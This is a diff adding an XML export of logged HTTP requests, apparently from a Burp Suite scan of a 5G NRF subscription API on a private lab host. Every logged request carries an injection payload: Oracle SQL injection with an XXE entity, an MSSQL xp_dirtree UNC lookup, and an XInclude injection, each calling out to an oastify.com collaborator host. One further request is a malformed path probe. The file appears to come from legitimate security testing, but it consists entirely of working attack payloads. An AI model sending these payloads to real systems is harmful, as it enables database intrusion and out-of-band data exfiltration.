@@ -1,0 +1,130 @@
+<items exportTime="Sat Feb 18 22:59:58 CET 2023">
+  <item>
+    <time>Sat Feb 18 22:44:46 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/subscriptions/{subscriptionID}?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20ubvce%20SYSTEM%20%22http%3a%2f%2f7iqpyro5t1698to9vmj3j78s5jba5yvmyasxil7.oasti'%7c%7c'fy.com%2f%22%3e%25ubvce%3b]%3e')%2c'%2fl')%20from%20dual)=1]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[DELETE]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/subscriptions/{subscriptionID}?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20ubvce%20SYSTEM%20%22http%3a%2f%2f7iqpyro5t1698to9vmj3j78s5jba5yvmyasxil7.oasti'%7c%7c'fy.com%2f%22%3e%25ubvce%3b]%3e')%2c'%2fl')%20from%20dual)=1]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[DELETE /nnrf-nfm/v1/subscriptions/{subscriptionID}?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20ubvce%20SYSTEM%20%22http%3a%2f%2f7iqpyro5t1698to9vmj3j78s5jba5yvmyasxil7.oasti'%7c%7c'fy.com%2f%22%3e%25ubvce%3b]%3e')%2c'%2fl')%20from%20dual)=1 HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+]]></request>
+    <status>404</status>
+    <responselength>139</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 404 Not Found
+Content-Type: application/problem+json
+Connection: Close
+Content-Length: 34
+
+{"cause":"SUBSCRIPTION_NOT_FOUND"}]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sat Feb 18 22:44:47 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/subscriptions/{subscriptionID}?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20ubvce%20SYSTEM%20%22http%3a%2f%2fi7q0n2dgicvkx4dkkx8e8ix3uu0lu9kxoli88wx.oasti'%7c%7c'fy.com%2f%22%3e%25ubvce%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[DELETE]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/subscriptions/{subscriptionID}?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20ubvce%20SYSTEM%20%22http%3a%2f%2fi7q0n2dgicvkx4dkkx8e8ix3uu0lu9kxoli88wx.oasti'%7c%7c'fy.com%2f%22%3e%25ubvce%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[DELETE /nnrf-nfm/v1/subscriptions/{subscriptionID}?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20ubvce%20SYSTEM%20%22http%3a%2f%2fi7q0n2dgicvkx4dkkx8e8ix3uu0lu9kxoli88wx.oasti'%7c%7c'fy.com%2f%22%3e%25ubvce%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1 HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+]]></request>
+    <status>404</status>
+    <responselength>139</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 404 Not Found
+Content-Type: application/problem+json
+Connection: Close
+Content-Length: 34
+
+{"cause":"SUBSCRIPTION_NOT_FOUND"}]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sat Feb 18 22:44:48 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/subscriptions/{subscriptionID}?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c0ijiykoytu628mo2vfjwj08l5cb35rvfm5azxple.oasti'%2b'fy.com%5cqzv'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[DELETE]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/subscriptions/{subscriptionID}?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c0ijiykoytu628mo2vfjwj08l5cb35rvfm5azxple.oasti'%2b'fy.com%5cqzv'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[DELETE /nnrf-nfm/v1/subscriptions/{subscriptionID}?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c0ijiykoytu628mo2vfjwj08l5cb35rvfm5azxple.oasti'%2b'fy.com%5cqzv'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+]]></request>
+    <status>404</status>
+    <responselength>139</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 404 Not Found
+Content-Type: application/problem+json
+Connection: Close
+Content-Length: 34
+
+{"cause":"SUBSCRIPTION_NOT_FOUND"}]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sat Feb 18 22:50:39 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/%3cfaj%20xmlns%3axi%3d%22http%3a//www.w3.org/2001/XInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a//j6q1m3chhdulw5cljy7f7jw4tvzmtajykmh99xy.oastify.com/foo%22/%3e%3c/faj%3e/{subscriptionID}]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[DELETE]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/%3cfaj%20xmlns%3axi%3d%22http%3a//www.w3.org/2001/XInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a//j6q1m3chhdulw5cljy7f7jw4tvzmtajykmh99xy.oastify.com/foo%22/%3e%3c/faj%3e/{subscriptionID}]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[DELETE /nnrf-nfm/v1/%3cfaj%20xmlns%3axi%3d%22http%3a//www.w3.org/2001/XInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a//j6q1m3chhdulw5cljy7f7jw4tvzmtajykmh99xy.oastify.com/foo%22/%3e%3c/faj%3e/{subscriptionID} HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+]]></request>
+    <status>404</status>
+    <responselength>100</responselength>
+    <mimetype>text</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 404 Not Found
+Connection: Close
+Content-Length: 35
+
+The requested method does not exist]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sat Feb 18 22:50:40 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/subscriptions]]%3e%3e%3c/{subscriptionID}]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[DELETE]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/subscriptions]]%3e%3e%3c/{subscriptionID}]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[DELETE /nnrf-nfm/v1/subscriptions]]%3e%3e%3c/{subscriptionID} HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+]]></request>
+    <status>404</status>
+    <responselength>100</responselength>
+    <mimetype>text</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 404 Not Found
+Connection: Close
+Content-Length: 35
+
+The requested method does not exist]]></response>
+    <comment></comment>
+  </item>
+</items>
